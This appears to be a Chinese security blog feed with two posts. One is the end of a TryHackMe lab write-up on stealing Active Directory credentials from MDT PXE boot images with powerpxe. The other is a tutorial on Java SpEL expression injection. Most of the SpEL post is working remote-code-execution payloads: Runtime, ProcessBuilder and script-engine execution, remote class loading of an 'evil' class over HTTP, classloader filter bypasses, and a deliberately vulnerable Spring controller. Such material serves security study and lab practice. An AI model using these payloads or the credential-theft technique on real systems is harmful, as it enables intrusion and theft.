团队的工作变得更加轻松。</p><p>然而，任何提供基础设施集中管理的东西（例如 MDT 和 SCCM）也可能成为攻击者的目标，试图接管该资产中的大部分关键功能。尽管可以通过多种方式配置 MDT，但对于此任务，我们将专门关注称为预启动执行环境 (PXE) 启动的配置。</p><h3 id="PXE启动"><a href="#PXE启动" class="headerlink" title="PXE启动"></a>PXE启动</h3><p>在 Active Directory（AD）域中，PXE 是 Preboot Execution Environment 的缩写。它是一种网络引导协议和技术，允许计算机通过网络启动并加载操作系统。</p><p><strong>具体来说，PXE 提供了一种方法，在计算机尚未启动操作系统时，从网络上获取并执行预先配置的启动文件。这些启动文件可以包含操作系统映像、安装程序或其他必要的组件。</strong>(<strong>个人觉得这句话概括的很好</strong>)</p><p>使用 PXE，管理员可以通过集中管理的方式轻松地为多台计算机提供统一的操作系统部署、更新或恢复功能。当计算机开机时，它会向 DHCP 服务器发送请求以获取 IP 地址，并根据 DHCP 服务器返回的信息进一步下载和执行 PXE 启动文件。</p><p>因此，在 AD 域中使用 PXE 可以帮助简化和自动化大规模计算机部署和维护过程，并提高效率和可靠性。</p><p>大型组织使用 PXE 引导来允许连接到网络的新设备直接通过网络连接加载和安装操作系统。 MDT 可用于创建、管理和托管 PXE 启动映像。 PXE 启动通常与 DHCP 集成，这意味着如果 DHCP 分配 IP 租约，则允许主机请求 PXE 启动映像并启动网络操作系统安装过程。通信流程如下图所示</p><p><img src="../images/8117a18103e98ee2ccda91fc87c63606.png" alt="img"></p><p>个人简单的总结一下 MDT PXE SCCM的差别 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MDT  就是相当于准备文件 将要做的东西准备好</span><br><span class="line">SCCM 就是对准备的东西负责检查更新</span><br><span class="line">PXE 就是对准备的东西进行命令执行来部署</span><br></pre></td></tr></table></figure><p>执行该过程后，客户端将使用 TFTP 连接下载 PXE 启动映像。我们可以将 PXE 启动映像用于两个不同的目的：</p><ul><li>注入权限升级向量（例如本地管理员帐户），以便在 PXE 启动完成后获得对操作系统的管理访问权限。</li><li>执行密码抓取攻击以恢复安装期间使用的 AD 凭据。</li></ul><p>在本任务中，我们将重点关注后者。我们将尝试在安装过程中恢复与 MDT 服务关联的部署服务帐户，以应对此密码抓取攻击。此外，还可以检索用于无人值守安装应用程序和服务的其他 AD 帐户。</p><h3 id="PXE-Boot-Image-Retrieval-PXE-启动映像检索"><a href="#PXE-Boot-Image-Retrieval-PXE-启动映像检索" class="headerlink" title="PXE Boot Image Retrieval PXE 启动映像检索"></a>PXE Boot Image Retrieval PXE 启动映像检索</h3><p>由于 DHCP 有点挑剔，我们将绕过此攻击的初始步骤。我们将跳过尝试从 DHCP 请求 IP 和 PXE 启动预配置详细信息的部分。我们将手动执行该过程中此步骤的其余攻击。</p><p>您通过 DHCP 收到的有关 PXE 启动预配置的第一条信息是 MDT 服务器的 IP。在我们的例子中，您可以从 TryHackMe 网络图中恢复该信息。</p><p>您收到的第二条信息是 BCD 文件的名称。这些文件存储与不同类型的体系结构的 PXE 引导相关的信息。要检索此信息，您需要连接到此网站：<a href="http://pxeboot.za.tryhackme.com。它将列出各种">http://pxeboot.za.tryhackme.com。它将列出各种</a> BCD 文件：</p><p><img src="../images/image-20230906210830635.png" alt="image-20230906210830635"></p><p>通常，您将使用 TFTP 请求每个 BCD 文件并枚举所有文件的配置。</p><p><img src="../images/image-20230906212716907.png" alt="image-20230906212716907"></p><p><strong>(解释一下这个BCD文件是啥)</strong></p><p>为了我们可以枚举并检索 PXE 启动映像  接下来进行ssh登录</p><p>登录之后 使用的这个工具  <code>powerpxe</code>(<strong>这个工具的话是可以预先进行对MDT的一些文件进行默认配置的</strong>)</p><p>前面的获取bsd和wim镜像的下载流程就不写了  跟着thm做就行了</p><p>接下来时讲 获取到这个pxe启动镜像的时候我们应该怎么做 <strong>怎么进行攻击利用</strong></p><p>现在我们已经恢复了 PXE 启动映像，我们可以窃取存储的凭据。应该指出的是，我们可以发起各种攻击。我们可以注入本地管理员用户，因此一旦映像启动，我们就拥有管理员访问权限，我们可以安装映像以拥有加入域的计算机。如果您有兴趣了解有关这些攻击的更多信息，可以阅读本文。本次练习将重点关注尝试窃取凭据的简单攻击。</p><p>我们将再次使用 powerpxe 来恢复凭据，但您也可以通过提取映像并查找 bootstrap.ini 文件（通常存储这些类型的凭据）来手动执行此步骤。要使用 powerpxe 从引导文件恢复凭据，请运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\THM\Documents\am0&gt; Get-FindCredentials -WimFile pxeboot.wim</span><br><span class="line">&gt;&gt; Open pxeboot.wim</span><br><span class="line">&gt;&gt;&gt;&gt; Finding Bootstrap.ini</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\THMMDT\MTDBuildLab$</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = &lt;account&gt;</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserDomain = ZA</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = &lt;password&gt;</span><br></pre></td></tr></table></figure><p>如您所见，powerpxe 能够恢复 AD 凭据。我们现在有了另一组可以使用的 AD 凭据！</p><p><strong>就是通过各种手段来获取这个PXE启动映像  因为这个里面含有这个默认的凭证  在企业域中大规模的配置后  我们可以使用这个获取到的凭证进行登录</strong></p><h2 id="Configuration-Files-配置文件"><a href="#Configuration-Files-配置文件" class="headerlink" title="Configuration Files 配置文件"></a>Configuration Files 配置文件</h2><p>这个没啥好写的  去看thm就行了 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上个星期刚把域控的部分看了一遍&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230904210903273.png&quot; alt=&quot;image-20230904210903273&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这是本题的这个网络拓扑图&lt;/stron</summary>
      
    
    
    
    
    <category term="thm-破坏AD域" scheme="https://ke1nys.github.io/tags/thm-%E7%A0%B4%E5%9D%8FAD%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>java-SpEL表达式注入</title>
    <link href="https://ke1nys.github.io/posts/64ee92be.html"/>
    <id>https://ke1nys.github.io/posts/64ee92be.html</id>
    <published>2023-09-04T09:51:42.000Z</published>
    <updated>2023-09-12T01:18:58.986Z</updated>
    
    <content type="html"><![CDATA[<p>参考文章</p><p><a href="https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">boo </a>  <a href="https://www.mi1k7ea.com/">Mi1k7ea </a> <a href="https://xz.aliyun.com/t/9245">先知社区</a></p><p>无意中看到这个SpEL这个表达式注入  想着不会 就找了几篇文章来进行学习一下</p><h2 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h2><p><img src="../images/image-20230904180213008.png" alt="image-20230904180213008"></p><p>直接复制照片</p><h2 id="SpEL定界符-与"><a href="#SpEL定界符-与" class="headerlink" title="SpEL定界符#{}与${}"></a>SpEL定界符#{}与${}</h2><p>这两个东西一点都不相同，<code>$&#123;&#125;</code>只是单纯的一个占位符，会引起一些注入，比如SQL注入之类的。而<code>#&#123;&#125;</code>这就是SPEL特有的定界符。中间的内容会被解析。</p><h2 id="类型表达式T"><a href="#类型表达式T" class="headerlink" title="类型表达式T()"></a>类型表达式T()</h2><p><img src="../images/image-20230904180406781.png" alt="image-20230904180406781"></p><p>理论的东西比较难理解  还是写个demo来演示一下吧</p><p><img src="../images/image-20230904183233018.png" alt="image-20230904183233018"></p><p>这个<code>T()</code>的意思就是将括号里面的内容解析成一个类</p><h2 id="SpEL表达式"><a href="#SpEL表达式" class="headerlink" title="SpEL表达式"></a>SpEL表达式</h2><p><img src="../images/image-20230904183355745.png" alt="image-20230904183355745"></p><p><img src="../images/image-20230904183503230.png" alt="image-20230904183503230"></p><p>这个变量和表达式的用法呢</p><p><a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%BC%95%E7%94%A8Bean%E3%80%81%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95">在这个文章里面有详细的介绍  这里就不多写了</a></p><p>就是调用bean的流程和操作</p><h2 id="使用SpEL进行RCE"><a href="#使用SpEL进行RCE" class="headerlink" title="使用SpEL进行RCE"></a>使用SpEL进行RCE</h2><p><strong>接下来是挨个介绍可使用的方法</strong></p><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ke1nys;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;new java.lang.ProcessBuilder(new String[]&#123;\&quot;calc\&quot;&#125;).start()&quot;</span>;</span><br><span class="line">        <span class="comment">//因为ProcessBuilder不是 static 所以需要手动进行实例化</span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话<code>ProcessBuilder</code>没用这个<code>T()</code>的原因我觉得是因为没有进行实例化  所以就不能使用  （个人看法）</p><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ke1nys;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ke1nys;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;T(javax.script.ScriptEngineManager).getEngineByName(\&quot;nashorn\&quot;).eval(\&quot;s=[1];s[0]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230904185858631.png" alt="image-20230904185858631"></p><p>这里进行报错是因为这个<code>ScriptEngineManager</code>类不是static的  所以需要手动进行new一下  </p><p><strong>nashorn———js引擎</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ke1nys;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;new javax.script.ScriptEngineManager().getEngineByName(\&quot;nashorn\&quot;).eval(\&quot;s=[1];s[0]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>;</span><br><span class="line">        <span class="comment">//这里的话是需要手动进行new一下的 后面是可以进行获取js引擎中的某个方法进行调用</span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230904190255469.png" alt="image-20230904190255469"></p><p><strong>JavaScript引擎</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ke1nys;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;new javax.script.ScriptEngineManager().getEngineByName(\&quot;javascript\&quot;).eval(\&quot;s=[1];s[0]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230904190415670.png" alt="image-20230904190415670"></p><p>其实JavaScriptengine已经可以做很多事情了，比如注入内存马之类的。Js代码是很灵活的。所以需要好好利用。<strong>(学这个SpEL还真学到东西了)</strong></p><h3 id="UrlClassloader-接下来就是远程类加载来RCE"><a href="#UrlClassloader-接下来就是远程类加载来RCE" class="headerlink" title="UrlClassloader (接下来就是远程类加载来RCE)"></a>UrlClassloader (接下来就是远程类加载来RCE)</h3><p>这个方法就是使用远程类加载来进行RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ke1nys;</span><br><span class="line"></span><br><span class="line">import org.springframework.expression.Expression;</span><br><span class="line">import org.springframework.expression.ExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line"></span><br><span class="line">public class SpEL &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception, MalformedURLException &#123;</span><br><span class="line">        String cmdStr = &quot;new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&#x27;http://127.0.0.1:8000/&#x27;)&#125;).loadClass(\&quot;evil\&quot;).getConstructors()[0].newInstance()&quot;;</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();//创建解析器</span><br><span class="line">        Expression exp = parser.parseExpression(cmdStr);//解析表达式</span><br><span class="line">        System.out.println( exp.getValue() );//弹出计算器</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后起一个python的http服务就行了</p><p><img src="../images/image-20230907140850904.png" alt="image-20230907140850904"></p><p><strong>这里有个注意点就是  以后在使用这个动态类加载的时候  在编写恶意类的时候</strong></p><p><strong>不用加package  因为会报错</strong></p><p><img src="../images/image-20230907141125047.png" alt="image-20230907141125047"></p><h3 id="系统类加载器"><a href="#系统类加载器" class="headerlink" title="系统类加载器"></a>系统类加载器</h3><p>这里加个解释就是这个<strong>系统类加载器</strong>和<strong>AppClassLoader</strong>的差别在哪</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">系统类加载器是 Java 虚拟机（JVM）默认的类加载器，通常是 AppClassLoader 的父类加载器。</span><br><span class="line">AppClassLoader 通常负责加载应用程序的类和资源文件，而不是加载 Java 核心库中的类（例如 java.lang.Runtime）。系统类加载器（或称为应用程序类加载器）是负责加载 Java 核心库和应用程序类的类加载器。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ke1nys;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception, MalformedURLException &#123;</span><br><span class="line">        <span class="comment">//String cmdStr = &quot;new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&#x27;http://127.0.0.1:8888/&#x27;)&#125;).loadClass(\&quot;evil\&quot;).getConstructors()[0].newInstance()&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230907142304764.png" alt="image-20230907142304764"></p><p>这里使用的就是这个系统类加载器来加载这个java核心库中的<code>Runtime</code>这个类</p><h4 id="在这个classloader被ban了之后-我们应该怎么来进行调用"><a href="#在这个classloader被ban了之后-我们应该怎么来进行调用" class="headerlink" title="在这个classloader被ban了之后 我们应该怎么来进行调用"></a>在这个classloader被ban了之后 我们应该怎么来进行调用</h4><p>这里有几种方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.expression.Expression).getClass().getClassLoader()</span><br><span class="line"><span class="comment">//这个问了gpt说这个代码是Thymeleaf 表达式，它尝试在模板中执行一些 Java 代码。然而，Thymeleaf 表达式的执行环境是在模板渲染时，不同于普通 Java 代码的执行环境。</span></span><br><span class="line"><span class="comment">//执行环境不同  所以就不能进行代码执行</span></span><br><span class="line">#thymeleaf 情况下</span><br><span class="line"></span><br><span class="line">T(org.thymeleaf.context.AbstractEngineContext).getClass().getClassLoader()</span><br><span class="line">#web服务下通过内置对象</span><br><span class="line"></span><br><span class="line">&#123;request.getClass().getClassLoader().loadClass(\<span class="string">&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;touch/tmp/foobar\&quot;)&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username[#this.getClass().forName(&quot;</span>javax.script.ScriptEngineManager<span class="string">&quot;).newInstance().getEngineByName(&quot;</span>js<span class="string">&quot;).eval(&quot;</span>java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;xterm&#x27;</span>)<span class="string">&quot;)]=asdf</span></span><br></pre></td></tr></table></figure><p>这里看的这几种方法就是在先知社区那里看到的</p><h3 id="Web服务无回显RCE"><a href="#Web服务无回显RCE" class="headerlink" title="Web服务无回显RCE"></a>Web服务无回显RCE</h3><p>这里的话很多Web服务就是虽然执行成功 但是没有把结果给回显出来 这里的话可以参考之前内存马的回显技术那篇文章  <a href="https://goodapple.top/archives/1355">文章</a></p><p><strong>(下面写的东西看起来都是和这个内存马那篇文章 差不多 用的某些类也是一样的)</strong></p><p><strong>这里的话简单写个demo来进行测试</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ke1nys;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.SpelParserConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpelController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/spel&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">spelvul</span><span class="params">(String payload)</span>&#123;</span><br><span class="line">        <span class="comment">//String cmdStr = &quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;;</span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>(<span class="keyword">new</span> <span class="title class_">SpelParserConfiguration</span>());<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(payload);<span class="comment">//解析表达式</span></span><br><span class="line">        <span class="keyword">return</span> (String) exp.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="BufferedReader"><a href="#BufferedReader" class="headerlink" title="BufferedReader"></a>BufferedReader</h4><p>其实这并不是纯粹的回显，因为你需要return这个返回结果，而真实情况一般是不会return这个结果的。<br><code>payload=new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(&quot;cmd&quot;, &quot;/c&quot;, &quot;whoami&quot;).start().getInputStream(), &quot;gbk&quot;)).readLine()</code></p><p><img src="../images/image-20230907153433694.png" alt="image-20230907153433694"></p><h4 